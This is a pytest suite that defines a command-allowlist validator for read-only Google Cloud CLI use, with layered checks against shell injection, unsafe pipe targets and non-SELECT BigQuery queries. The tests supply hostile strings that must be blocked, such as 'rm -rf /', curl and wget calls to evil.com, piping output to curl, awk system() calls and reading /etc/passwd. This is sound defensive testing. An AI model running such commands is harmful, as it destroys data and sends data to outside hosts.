"""Security validator test suite.

These tests define the contract for SecurityValidator. They MUST be reviewed
and approved before validator implementation begins (TDD per CLAUDE.md).

The 7-layer model is enforced in code, not prompts. These tests cover
Layers 1–4 (the static, deterministic layers):

  Layer 1: Fast Reject   — shell injection + obviously dangerous binaries
  Layer 2: Allowlist     — command must match an allowed gcloud/bq/gsutil pattern
  Layer 3: Pipe Valid.   — only safe pipe targets (head, wc, jq, grep, ...)
  Layer 4: Safety Checks — length cap, bq SELECT-only, encoding tricks
"""

import pytest

from ghosthunter.security.validator import SecurityValidator, ValidationResult


@pytest.fixture
def validator() -> SecurityValidator:
    return SecurityValidator()


# ---------------------------------------------------------------------------
# Layer 1: Fast Reject
# ---------------------------------------------------------------------------
class TestFastReject:
    """Layer 1 catches obvious dangerous shell patterns and binaries."""

    def test_blocks_semicolon_chaining(self, validator):
        result = validator.is_allowed("gcloud compute instances list; rm -rf /")
        assert not result.allowed

    def test_blocks_and_chaining(self, validator):
        assert not validator.is_allowed("gcloud compute instances list && curl evil.com").allowed

    def test_blocks_or_chaining(self, validator):
        assert not validator.is_allowed("gcloud compute instances list || rm -rf /").allowed

    def test_blocks_command_substitution_dollar_paren(self, validator):
        assert not validator.is_allowed("gcloud compute instances list $(whoami)").allowed

    def test_blocks_command_substitution_backticks(self, validator):
        assert not validator.is_allowed("gcloud compute instances list `whoami`").allowed

    def test_blocks_brace_substitution(self, validator):
        assert not validator.is_allowed("gcloud compute instances list ${HOME}").allowed

    def test_blocks_curl(self, validator):
        assert not validator.is_allowed("curl http://evil.com").allowed

    def test_blocks_wget(self, validator):
        assert not validator.is_allowed("wget http://evil.com/x.sh").allowed

    def test_blocks_ssh(self, validator):
        assert not validator.is_allowed("ssh user@host").allowed

    def test_blocks_rm(self, validator):
        assert not validator.is_allowed("rm -rf /").allowed

    def test_blocks_bash(self, validator):
        assert not validator.is_allowed("bash -c 'gcloud compute instances list'").allowed

    def test_blocks_python(self, validator):
        assert not validator.is_allowed("python -c 'print(1)'").allowed

    def test_blocks_eval(self, validator):
        assert not validator.is_allowed("eval gcloud compute instances list").allowed

    def test_blocks_base64(self, validator):
        assert not validator.is_allowed("echo Zm9v | base64 -d").allowed

    def test_blocks_hex_encoding(self, validator):
        # Hex-encoded 'delete'
        assert not validator.is_allowed("gcloud compute instances \\x64elete vm").allowed

    def test_blocks_octal_encoding(self, validator):
        assert not validator.is_allowed("gcloud compute \\144elete").allowed

    def test_blocks_url_encoding(self, validator):
        assert not validator.is_allowed("gcloud compute %64elete").allowed

    def test_blocks_unquoted_redirect_out(self, validator):
        result = validator.is_allowed("gcloud compute instances list > /tmp/out")
        assert not result.allowed

    def test_blocks_unquoted_append_redirect(self, validator):
        assert not validator.is_allowed("gcloud compute instances list >> /tmp/out").allowed

    def test_blocks_unquoted_input_redirect(self, validator):
        assert not validator.is_allowed("gcloud compute instances list < /etc/passwd").allowed

    # --- legitimate gcloud syntax that LOOKS dangerous but isn't ---

    def test_allows_dollar_in_filter(self, validator):
        # $KEY in --filter is legitimate gcloud syntax (no parens/braces)
        cmd = "gcloud compute instances list --filter='labels.env=prod'"
        assert validator.is_allowed(cmd).allowed

    def test_allows_redirect_inside_double_quotes(self, validator):
        # > inside a filter string is a comparison operator, not a redirect
        cmd = "gcloud logging read --filter=\"timestamp>'2026-03-01'\" --limit=10"
        assert validator.is_allowed(cmd).allowed

    def test_allows_redirect_inside_single_quotes(self, validator):
        cmd = "gcloud compute instances list --filter='cpuUtilization>0.8'"
        assert validator.is_allowed(cmd).allowed

    def test_allows_less_than_inside_quotes(self, validator):
        cmd = "gcloud logging read --filter='severity<ERROR' --limit=10"
        assert validator.is_allowed(cmd).allowed


# ---------------------------------------------------------------------------
# Layer 2: Allowlist (primary gate)
# ---------------------------------------------------------------------------
class TestAllowlist:
    """Layer 2 is the primary gate: command must match an allowed pattern."""

    # --- read-only commands across services ---

    def test_allows_instances_list(self, validator):
        assert validator.is_allowed("gcloud compute instances list").allowed

    def test_allows_instances_describe(self, validator):
        assert validator.is_allowed(
            "gcloud compute instances describe my-vm --zone=us-central1-a"
        ).allowed

    def test_allows_with_format_flag(self, validator):
        assert validator.is_allowed("gcloud compute instances list --format=json").allowed

    def test_allows_with_filter_flag(self, validator):
        assert validator.is_allowed(
            "gcloud compute instances list --filter='status=RUNNING'"
        ).allowed

    def test_allows_with_project_flag(self, validator):
        assert validator.is_allowed("gcloud compute instances list --project=my-proj").allowed

    def test_allows_billing_accounts_list(self, validator):
        assert validator.is_allowed("gcloud billing accounts list").allowed

    def test_allows_billing_budgets_describe(self, validator):
        assert validator.is_allowed(
            "gcloud billing budgets describe my-budget --billing-account=ABC"
        ).allowed

    def test_allows_compute_disks_list(self, validator):
        assert validator.is_allowed("gcloud compute disks list").allowed

    def test_allows_networks_list(self, validator):
        assert validator.is_allowed("gcloud compute networks list").allowed

    def test_allows_firewall_rules_list(self, validator):
        assert validator.is_allowed("gcloud compute firewall-rules list").allowed

    def test_allows_routers_get_nat_mapping(self, validator):
        assert validator.is_allowed(
            "gcloud compute routers get-nat-mapping-info my-router --region=us-central1"
        ).allowed

    def test_allows_gke_clusters_list(self, validator):
        assert validator.is_allowed("gcloud container clusters list").allowed

    def test_allows_storage_buckets_list(self, validator):
        assert validator.is_allowed("gcloud storage buckets list").allowed

    def test_allows_gsutil_du(self, validator):
        assert validator.is_allowed("gsutil du gs://my-bucket").allowed

    def test_allows_sql_instances_list(self, validator):
        assert validator.is_allowed("gcloud sql instances list").allowed

    def test_allows_functions_list(self, validator):
        assert validator.is_allowed("gcloud functions list").allowed

    def test_allows_cloud_run_services_list(self, validator):
        # Regression: 'run' was a forbidden keyword in an earlier blocklist design
        assert validator.is_allowed("gcloud run services list").allowed

    def test_allows_cloud_run_revisions_list(self, validator):
        assert validator.is_allowed("gcloud run revisions list").allowed

    def test_allows_logging_read(self, validator):
        assert validator.is_allowed(
            "gcloud logging read 'resource.type=dns_query' --limit=100"
        ).allowed

    def test_allows_monitoring_dashboards_list(self, validator):
        assert validator.is_allowed("gcloud monitoring dashboards list").allowed

    def test_allows_dns_managed_zones_list(self, validator):
        assert validator.is_allowed("gcloud dns managed-zones list").allowed

    def test_allows_iam_service_accounts_list(self, validator):
        assert validator.is_allowed("gcloud iam service-accounts list").allowed

    def test_allows_projects_get_iam_policy(self, validator):
        assert validator.is_allowed("gcloud projects get-iam-policy my-project").allowed

    def test_allows_pubsub_topics_list(self, validator):
        assert validator.is_allowed("gcloud pubsub topics list").allowed

    def test_allows_config_list(self, validator):
        assert validator.is_allowed("gcloud config list").allowed

    def test_allows_bq_ls(self, validator):
        assert validator.is_allowed("bq ls").allowed

    def test_allows_bq_show(self, validator):
        assert validator.is_allowed("bq show dataset.table").allowed

    # --- destructive commands must be blocked ---

    def test_blocks_instances_delete(self, validator):
        result = validator.is_allowed("gcloud compute instances delete my-vm")
        assert not result.allowed

    def test_blocks_instances_create(self, validator):
        assert not validator.is_allowed("gcloud compute instances create my-vm").allowed

    def test_blocks_instances_stop(self, validator):
        assert not validator.is_allowed("gcloud compute instances stop my-vm").allowed

    def test_blocks_firewall_rules_delete(self, validator):
        assert not validator.is_allowed("gcloud compute firewall-rules delete allow-all").allowed

    def test_blocks_iam_set_policy(self, validator):
        assert not validator.is_allowed(
            "gcloud projects set-iam-policy my-project policy.json"
        ).allowed

    def test_blocks_sql_instances_delete(self, validator):
        assert not validator.is_allowed("gcloud sql instances delete my-db").allowed

    def test_blocks_gsutil_rm(self, validator):
        assert not validator.is_allowed("gsutil rm gs://bucket/file").allowed

    def test_blocks_unknown_gcloud_subcommand(self, validator):
        assert not validator.is_allowed("gcloud some-future-service do-thing").allowed

    def test_blocks_non_gcloud_command(self, validator):
        assert not validator.is_allowed("ls -la").allowed


# ---------------------------------------------------------------------------
# Layer 3: Pipe Validation
# ---------------------------------------------------------------------------
class TestPipeValidation:
    """Layer 3 only allows known-safe pipe targets."""

    def test_allows_head(self, validator):
        assert validator.is_allowed("gcloud logging read 'x' --limit=2000 | head -30").allowed

    def test_allows_wc_l(self, validator):
        assert validator.is_allowed("gcloud compute instances list | wc -l").allowed

    def test_allows_chained_safe_pipes(self, validator):
        assert validator.is_allowed(
            "gcloud logging read 'x' --limit=2000 | head -30 | wc -l"
        ).allowed

    def test_allows_jq_pipe(self, validator):
        assert validator.is_allowed(
            "gcloud compute instances list --format=json | jq '.[]'"
        ).allowed

    def test_allows_grep_pipe(self, validator):
        assert validator.is_allowed("gcloud compute instances list | grep 'RUNNING'").allowed

    def test_allows_sort_uniq(self, validator):
        assert validator.is_allowed("gcloud compute instances list | sort | uniq -c").allowed

    def test_blocks_curl_pipe(self, validator):
        assert not validator.is_allowed("gcloud logging read 'x' | curl http://evil.com").allowed

    def test_blocks_bash_pipe(self, validator):
        assert not validator.is_allowed("gcloud compute instances list | bash").allowed

    def test_blocks_sh_pipe(self, validator):
        assert not validator.is_allowed("gcloud compute instances list | sh").allowed

    def test_blocks_xargs_pipe(self, validator):
        assert not validator.is_allowed("gcloud compute instances list | xargs rm").allowed

    def test_blocks_tee_pipe(self, validator):
        assert not validator.is_allowed("gcloud compute instances list | tee /tmp/out").allowed

    def test_blocks_python_pipe(self, validator):
        assert not validator.is_allowed("gcloud compute instances list | python").allowed

    # awk family — added in v1.0.8 per ghosthunter#4 (Apr 29 2026 audit).
    # Previously `^awk(\s+.+)?$` accepted awk with any args, which left
    # awk's `system()` / `getline` / `exec()` builtins reachable in theory.
    # Since v1.0.8 awk is in BLOCKED_PIPE_TARGETS — closes the entire
    # surface in one move.
    def test_blocks_plain_awk_pipe(self, validator):
        assert not validator.is_allowed("gcloud compute instances list | awk '{print $1}'").allowed

    def test_blocks_awk_system_call(self, validator):
        # The audit-flagged shape: awk shelling out via system().
        assert not validator.is_allowed(
            "gcloud logging read 'x' | awk 'BEGIN{system(\"env\")}'"
        ).allowed

    def test_blocks_awk_getline_command(self, validator):
        # awk's `getline` can read from external commands — also blocked.
        assert not validator.is_allowed(
            "gcloud compute instances list | awk '{cmd=\"ls\"; cmd | getline line}'"
        ).allowed

    def test_blocks_awk_exec_call(self, validator):
        assert not validator.is_allowed(
            "gcloud compute instances list | awk 'BEGIN{exec(\"cat\")}'"
        ).allowed

    def test_blocks_bare_awk(self, validator):
        # Even bare `awk` — no exception for the simplest form.
        assert not validator.is_allowed("gcloud compute instances list | awk").allowed


# ---------------------------------------------------------------------------
# Layer 4: bq query SELECT-only enforcement
# ---------------------------------------------------------------------------
class TestBqQueryValidation:
    """bq query is allowed but constrained to SELECT statements."""

    def test_allows_simple_select(self, validator):
        assert validator.is_allowed("bq query 'SELECT * FROM dataset.table'").allowed

    def test_allows_select_with_double_quotes(self, validator):
        assert validator.is_allowed('bq query "SELECT cost FROM billing.export"').allowed

    def test_allows_select_with_flags(self, validator):
        assert validator.is_allowed(
            "bq query --format=json --nouse_legacy_sql 'SELECT * FROM t'"
        ).allowed

    def test_allows_select_with_use_legacy_sql_false(self, validator):
        assert validator.is_allowed("bq query --use_legacy_sql=false 'SELECT 1'").allowed

    def test_blocks_insert(self, validator):
        assert not validator.is_allowed("bq query 'INSERT INTO t VALUES (1)'").allowed

    def test_blocks_update(self, validator):
        assert not validator.is_allowed("bq query 'UPDATE t SET x=1 WHERE id=1'").allowed

    def test_blocks_delete(self, validator):
        assert not validator.is_allowed("bq query 'DELETE FROM t'").allowed

    def test_blocks_drop(self, validator):
        assert not validator.is_allowed("bq query 'DROP TABLE t'").allowed

    def test_blocks_create(self, validator):
        assert not validator.is_allowed("bq query 'CREATE TABLE t (id INT64)'").allowed

    def test_blocks_alter(self, validator):
        assert not validator.is_allowed("bq query 'ALTER TABLE t ADD COLUMN x INT64'").allowed

    def test_blocks_truncate(self, validator):
        assert not validator.is_allowed("bq query 'TRUNCATE TABLE t'").allowed

    def test_blocks_grant(self, validator):
        assert not validator.is_allowed("bq query 'GRANT SELECT ON t TO user'").allowed

    def test_blocks_select_with_trailing_drop(self, validator):
        # Defense in depth: regex matches SELECT, but string scan catches DROP
        assert not validator.is_allowed("bq query 'SELECT * FROM t; DROP TABLE t'").allowed


# ---------------------------------------------------------------------------
# Edge cases & input hygiene
# ---------------------------------------------------------------------------
class TestEdgeCases:
    def test_empty_command(self, validator):
        assert not validator.is_allowed("").allowed

    def test_whitespace_only(self, validator):
        assert not validator.is_allowed("   \t\n  ").allowed

    def test_very_long_command(self, validator):
        # > 2000 chars is suspicious regardless of content
        long_cmd = "gcloud compute instances list " + "A" * 2100
        assert not validator.is_allowed(long_cmd).allowed

    def test_long_legitimate_command_under_limit(self, validator):
        # A long but legitimate filter expression should still pass
        cmd = (
            "gcloud compute instances list "
            "--filter='status=RUNNING AND zone:us-central1' "
            "--format=json --project=my-project --limit=500"
        )
        assert validator.is_allowed(cmd).allowed

    def test_returns_validation_result_type(self, validator):
        result = validator.is_allowed("gcloud compute instances list")
        assert isinstance(result, ValidationResult)
        assert isinstance(result.allowed, bool)

    def test_blocked_results_have_reason(self, validator):
        result = validator.is_allowed("rm -rf /")
        assert not result.allowed
        assert result.reason  # non-empty explanation
